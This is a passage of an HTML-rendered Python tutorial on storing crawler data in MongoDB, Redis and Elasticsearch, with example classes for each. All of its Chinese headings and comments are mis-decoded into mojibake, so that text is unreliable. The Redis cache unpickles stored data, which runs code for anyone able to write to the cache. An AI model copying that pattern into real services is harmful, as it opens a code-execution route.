        <span class="bp">self</span><span class="o">.</span><span class="n">client</span> <span class="o">=</span> <span class="n">MongoClient</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">db</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="p">[</span><span class="n">db_name</span><span class="p">]</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">articles</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">articles</span>

        <span class="c1"># åˆ›å»ºç´¢å¼•</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">articles</span><span class="o">.</span><span class="n">create_index</span><span class="p">([(</span><span class="s1">&#39;user_id&#39;</span><span class="p">,</span> <span class="n">ASCENDING</span><span class="p">)])</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">articles</span><span class="o">.</span><span class="n">create_index</span><span class="p">([(</span><span class="s1">&#39;created_at&#39;</span><span class="p">,</span> <span class="n">DESCENDING</span><span class="p">)])</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">articles</span><span class="o">.</span><span class="n">create_index</span><span class="p">([(</span><span class="s1">&#39;title&#39;</span><span class="p">,</span> <span class="s1">&#39;text&#39;</span><span class="p">),</span> <span class="p">(</span><span class="s1">&#39;content&#39;</span><span class="p">,</span> <span class="s1">&#39;text&#39;</span><span class="p">)])</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">insert_article</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">article</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ’å…¥æ–‡ç« &quot;&quot;&quot;</span>
        <span class="n">article</span><span class="p">[</span><span class="s1">&#39;created_at&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>
        <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">articles</span><span class="o">.</span><span class="n">insert_one</span><span class="p">(</span><span class="n">article</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">result</span><span class="o">.</span><span class="n">inserted_id</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">batch_insert</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">articles</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ‰¹é‡æ’å…¥&quot;&quot;&quot;</span>
        <span class="k">for</span> <span class="n">article</span> <span class="ow">in</span> <span class="n">articles</span><span class="p">:</span>
            <span class="n">article</span><span class="p">[</span><span class="s1">&#39;created_at&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>
        <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">articles</span><span class="o">.</span><span class="n">insert_many</span><span class="p">(</span><span class="n">articles</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">result</span><span class="o">.</span><span class="n">inserted_ids</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">find_by_user</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">limit</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æŸ¥è¯¢ç”¨æˆ·æ–‡ç« &quot;&quot;&quot;</span>
        <span class="n">cursor</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">articles</span><span class="o">.</span><span class="n">find</span><span class="p">(</span>
            <span class="p">{</span><span class="s1">&#39;user_id&#39;</span><span class="p">:</span> <span class="n">user_id</span><span class="p">}</span>
        <span class="p">)</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="s1">&#39;created_at&#39;</span><span class="p">,</span> <span class="n">DESCENDING</span><span class="p">)</span><span class="o">.</span><span class="n">limit</span><span class="p">(</span><span class="n">limit</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">list</span><span class="p">(</span><span class="n">cursor</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">update_views</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">article_id</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ›´æ–°æµè§ˆé‡&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">articles</span><span class="o">.</span><span class="n">update_one</span><span class="p">(</span>
            <span class="p">{</span><span class="s1">&#39;_id&#39;</span><span class="p">:</span> <span class="n">article_id</span><span class="p">},</span>
            <span class="p">{</span><span class="s1">&#39;$inc&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;stats.views&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">}}</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">text_search</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">keyword</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å…¨æ–‡æœç´¢&quot;&quot;&quot;</span>
        <span class="n">cursor</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">articles</span><span class="o">.</span><span class="n">find</span><span class="p">(</span>
            <span class="p">{</span><span class="s1">&#39;$text&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;$search&#39;</span><span class="p">:</span> <span class="n">keyword</span><span class="p">}}</span>
        <span class="p">)</span><span class="o">.</span><span class="n">limit</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">list</span><span class="p">(</span><span class="n">cursor</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">aggregate_stats</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;èšåˆç»Ÿè®¡&quot;&quot;&quot;</span>
        <span class="n">pipeline</span> <span class="o">=</span> <span class="p">[</span>
            <span class="p">{</span><span class="s1">&#39;$group&#39;</span><span class="p">:</span> <span class="p">{</span>
                <span class="s1">&#39;_id&#39;</span><span class="p">:</span> <span class="s1">&#39;$user_id&#39;</span><span class="p">,</span>
                <span class="s1">&#39;total_articles&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;$sum&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">},</span>
                <span class="s1">&#39;total_views&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;$sum&#39;</span><span class="p">:</span> <span class="s1">&#39;$stats.views&#39;</span><span class="p">}</span>
            <span class="p">}},</span>
            <span class="p">{</span><span class="s1">&#39;$sort&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;total_views&#39;</span><span class="p">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">}},</span>
            <span class="p">{</span><span class="s1">&#39;$limit&#39;</span><span class="p">:</span> <span class="mi">10</span><span class="p">}</span>
        <span class="p">]</span>
        <span class="k">return</span> <span class="nb">list</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">articles</span><span class="o">.</span><span class="n">aggregate</span><span class="p">(</span><span class="n">pipeline</span><span class="p">))</span>
</code></pre>
      </div>

      <hr />

      <h2 id="redis">Redis</h2>

      <h3 id="é€‚ç”¨åœºæ™¯-3">é€‚ç”¨åœºæ™¯</h3>

      <ul>
        <li>ç¼“å­˜çƒ­ç‚¹æ•°æ®</li>
        <li>åˆ†å¸ƒå¼é”</li>
        <li>æ¶ˆæ¯é˜Ÿåˆ—</li>
        <li>è®¡æ•°å™¨ã€æ’è¡Œæ¦œ</li>
        <li>Session å­˜å‚¨</li>
      </ul>

      <h3 id="ä½¿ç”¨ç¤ºä¾‹">ä½¿ç”¨ç¤ºä¾‹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">redis</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">functools</span><span class="w"> </span><span class="kn">import</span> <span class="n">wraps</span>

<span class="k">class</span><span class="w"> </span><span class="nc">RedisStorage</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">6379</span><span class="p">,</span> <span class="n">db</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">port</span><span class="p">,</span> <span class="n">db</span><span class="o">=</span><span class="n">db</span><span class="p">,</span> <span class="n">decode_responses</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">cache_result</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">expire</span><span class="o">=</span><span class="mi">3600</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç¼“å­˜æ•°æ®&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">setex</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">expire</span><span class="p">,</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_cache</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–ç¼“å­˜&quot;&quot;&quot;</span>
        <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        <span class="k">return</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">cache_decorator</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">expire</span><span class="o">=</span><span class="mi">3600</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç¼“å­˜è£…é¥°å™¨&quot;&quot;&quot;</span>
        <span class="k">def</span><span class="w"> </span><span class="nf">decorator</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>
            <span class="nd">@wraps</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>
            <span class="k">def</span><span class="w"> </span><span class="nf">wrapper</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
                <span class="n">cache_key</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">func</span><span class="o">.</span><span class="vm">__name__</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">args</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">kwargs</span><span class="si">}</span><span class="s2">&quot;</span>
                <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_cache</span><span class="p">(</span><span class="n">cache_key</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">result</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
                    <span class="k">return</span> <span class="n">result</span>

                <span class="n">result</span> <span class="o">=</span> <span class="n">func</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">cache_result</span><span class="p">(</span><span class="n">cache_key</span><span class="p">,</span> <span class="n">result</span><span class="p">,</span> <span class="n">expire</span><span class="p">)</span>
                <span class="k">return</span> <span class="n">result</span>
            <span class="k">return</span> <span class="n">wrapper</span>
        <span class="k">return</span> <span class="n">decorator</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">incr_counter</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è®¡æ•°å™¨&quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">incr</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">add_to_set</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="o">*</span><span class="n">values</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ·»åŠ åˆ°é›†åˆ&quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">sadd</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="o">*</span><span class="n">values</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">is_crawled</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ£€æŸ¥ URL æ˜¯å¦å·²çˆ¬å–&quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">sismember</span><span class="p">(</span><span class="s1">&#39;crawled_urls&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">mark_as_crawled</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ ‡è®° URL å·²çˆ¬å–&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">sadd</span><span class="p">(</span><span class="s1">&#39;crawled_urls&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">add_to_queue</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">queue_name</span><span class="p">,</span> <span class="n">item</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ·»åŠ åˆ°é˜Ÿåˆ—&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">lpush</span><span class="p">(</span><span class="n">queue_name</span><span class="p">,</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">item</span><span class="p">))</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_from_queue</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">queue_name</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä»é˜Ÿåˆ—è·å–&quot;&quot;&quot;</span>
        <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">brpop</span><span class="p">(</span><span class="n">queue_name</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">result</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
        <span class="k">return</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">sorted_set_add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">score</span><span class="p">,</span> <span class="n">member</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ·»åŠ åˆ°æœ‰åºé›†åˆ&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">zadd</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="p">{</span><span class="n">member</span><span class="p">:</span> <span class="n">score</span><span class="p">})</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_top_n</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">n</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–æ’è¡Œæ¦œå‰ N å&quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">zrevrange</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">withscores</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="elasticsearch">Elasticsearch</h2>

      <h3 id="é€‚ç”¨åœºæ™¯-4">é€‚ç”¨åœºæ™¯</h3>

      <ul>
        <li>å…¨æ–‡æœç´¢</li>
        <li>æ—¥å¿—åˆ†æ</li>
        <li>å®æ—¶æ•°æ®åˆ†æ</li>
        <li>å¤§è§„æ¨¡æ•°æ®æ£€ç´¢</li>
      </ul>

      <h3 id="ç´¢å¼•è®¾è®¡ç¤ºä¾‹">ç´¢å¼•è®¾è®¡ç¤ºä¾‹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">elasticsearch</span><span class="w"> </span><span class="kn">import</span> <span class="n">Elasticsearch</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">datetime</span><span class="w"> </span><span class="kn">import</span> <span class="n">datetime</span>

<span class="k">class</span><span class="w"> </span><span class="nc">ElasticsearchStorage</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">hosts</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;localhost:9200&#39;</span><span class="p">]):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">es</span> <span class="o">=</span> <span class="n">Elasticsearch</span><span class="p">(</span><span class="n">hosts</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">index_name</span> <span class="o">=</span> <span class="s1">&#39;articles&#39;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_create_index</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">_create_index</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;åˆ›å»ºç´¢å¼•&quot;&quot;&quot;</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">es</span><span class="o">.</span><span class="n">indices</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">index</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">index_name</span><span class="p">):</span>
            <span class="n">mapping</span> <span class="o">=</span> <span class="p">{</span>
                <span class="s1">&#39;mappings&#39;</span><span class="p">:</span> <span class="p">{</span>
                    <span class="s1">&#39;properties&#39;</span><span class="p">:</span> <span class="p">{</span>
                        <span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="p">{</span>
                            <span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;text&#39;</span><span class="p">,</span>
                            <span class="s1">&#39;analyzer&#39;</span><span class="p">:</span> <span class="s1">&#39;ik_max_word&#39;</span><span class="p">,</span>
                            <span class="s1">&#39;search_analyzer&#39;</span><span class="p">:</span> <span class="s1">&#39;ik_smart&#39;</span>
                        <span class="p">},</span>
                        <span class="s1">&#39;content&#39;</span><span class="p">:</span> <span class="p">{</span>
                            <span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;text&#39;</span><span class="p">,</span>
                            <span class="s1">&#39;analyzer&#39;</span><span class="p">:</span> <span class="s1">&#39;ik_max_word&#39;</span>
                        <span class="p">},</span>
                        <span class="s1">&#39;author&#39;</span><span class="p">:</span> <span class="p">{</span>
                            <span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;keyword&#39;</span>
                        <span class="p">},</span>
                        <span class="s1">&#39;tags&#39;</span><span class="p">:</span> <span class="p">{</span>
                            <span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;keyword&#39;</span>
                        <span class="p">},</span>
                        <span class="s1">&#39;created_at&#39;</span><span class="p">:</span> <span class="p">{</span>
                            <span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;date&#39;</span>
                        <span class="p">},</span>
                        <span class="s1">&#39;view_count&#39;</span><span class="p">:</span> <span class="p">{</span>
                            <span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;integer&#39;</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">es</span><span class="o">.</span><span class="n">indices</span><span class="o">.</span><span class="n">create</span><span class="p">(</span><span class="n">index</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">index_name</span><span class="p">,</span> <span class="n">body</span><span class="o">=</span><span class="n">mapping</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">index_document</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">doc_id</span><span class="p">,</span> <span class="n">document</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç´¢å¼•æ–‡æ¡£&quot;&quot;&quot;</span>
        <span class="n">document</span><span class="p">[</span><span class="s1">&#39;created_at&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">es</span><span class="o">.</span><span class="n">index</span><span class="p">(</span>
            <span class="n">index</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">index_name</span><span class="p">,</span>
            <span class="nb">id</span><span class="o">=</span><span class="n">doc_id</span><span class="p">,</span>
            <span class="n">body</span><span class="o">=</span><span class="n">document</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">bulk_index</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">documents</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ‰¹é‡ç´¢å¼•&quot;&quot;&quot;</span>
        <span class="kn">from</span><span class="w"> </span><span class="nn">elasticsearch.helpers</span><span class="w"> </span><span class="kn">import</span> <span class="n">bulk</span>

        <span class="n">actions</span> <span class="o">=</span> <span class="p">[</span>
            <span class="p">{</span>
                <span class="s1">&#39;_index&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">index_name</span><span class="p">,</span>
                <span class="s1">&#39;_id&#39;</span><span class="p">:</span> <span class="n">doc</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">],</span>
                <span class="s1">&#39;_source&#39;</span><span class="p">:</span> <span class="n">doc</span>
            <span class="p">}</span>
            <span class="k">for</span> <span class="n">doc</span> <span class="ow">in</span> <span class="n">documents</span>
        <span class="p">]</span>
        <span class="k">return</span> <span class="n">bulk</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">es</span><span class="p">,</span> <span class="n">actions</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">search</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æœç´¢&quot;&quot;&quot;</span>
        <span class="n">body</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;query&#39;</span><span class="p">:</span> <span class="p">{</span>
                <span class="s1">&#39;multi_match&#39;</span><span class="p">:</span> <span class="p">{</span>
                    <span class="s1">&#39;query&#39;</span><span class="p">:</span> <span class="n">query</span><span class="p">,</span>
                    <span class="s1">&#39;fields&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;title^2&#39;</span><span class="p">,</span> <span class="s1">&#39;content&#39;</span><span class="p">]</span>
                <span class="p">}</span>
            <span class="p">},</span>
            <span class="s1">&#39;highlight&#39;</span><span class="p">:</span> <span class="p">{</span>
                <span class="s1">&#39;fields&#39;</span><span class="p">:</span> <span class="p">{</span>
                    <span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="p">{},</span>
                    <span class="s1">&#39;content&#39;</span><span class="p">:</span> <span class="p">{}</span>
                <span class="p">}</span>
            <span class="p">},</span>
            <span class="s1">&#39;size&#39;</span><span class="p">:</span> <span class="n">size</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">es</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">index</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">index_name</span><span class="p">,</span> <span class="n">body</span><span class="o">=</span><span class="n">body</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">search_by_tags</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">tags</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æŒ‰æ ‡ç­¾æœç´¢&quot;&quot;&quot;</span>
        <span class="n">body</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;query&#39;</span><span class="p">:</span> <span class="p">{</span>
                <span class="s1">&#39;terms&#39;</span><span class="p">:</span> <span class="p">{</span>
                    <span class="s1">&#39;tags&#39;</span><span class="p">:</span> <span class="n">tags</span>
                <span class="p">}</span>
            <span class="p">},</span>
            <span class="s1">&#39;size&#39;</span><span class="p">:</span> <span class="n">size</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">es</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">index</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">index_name</span><span class="p">,</span> <span class="n">body</span><span class="o">=</span><span class="n">body</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">aggregate_by_author</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æŒ‰ä½œè€…èšåˆ&quot;&quot;&quot;</span>
        <span class="n">body</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;size&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
            <span class="s1">&#39;aggs&#39;</span><span class="p">:</span> <span class="p">{</span>
                <span class="s1">&#39;authors&#39;</span><span class="p">:</span> <span class="p">{</span>
                    <span class="s1">&#39;terms&#39;</span><span class="p">:</span> <span class="p">{</span>
                        <span class="s1">&#39;field&#39;</span><span class="p">:</span> <span class="s1">&#39;author&#39;</span><span class="p">,</span>
                        <span class="s1">&#39;size&#39;</span><span class="p">:</span> <span class="mi">10</span>
                    <span class="p">},</span>
                    <span class="s1">&#39;aggs&#39;</span><span class="p">:</span> <span class="p">{</span>
                        <span class="s1">&#39;avg_views&#39;</span><span class="p">:</span> <span class="p">{</span>
                            <span class="s1">&#39;avg&#39;</span><span class="p">:</span> <span class="p">{</span>
                                <span class="s1">&#39;field&#39;</span><span class="p">:</span> <span class="s1">&#39;view_count&#39;</span>
                            <span class="p">}</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">es</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">index</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">index_name</span><span class="p">,</span> <span class="n">body</span><span class="o">=</span><span class="n">body</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ··åˆå­˜å‚¨æ–¹æ¡ˆ">æ··åˆå­˜å‚¨æ–¹æ¡ˆ</h2>

      <h3 id="å…¸å‹æ¶æ„">å…¸å‹æ¶æ„</h3>

      <pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          Application Layer          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
              â”‚
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚                    â”‚
    â–¼                    â–¼
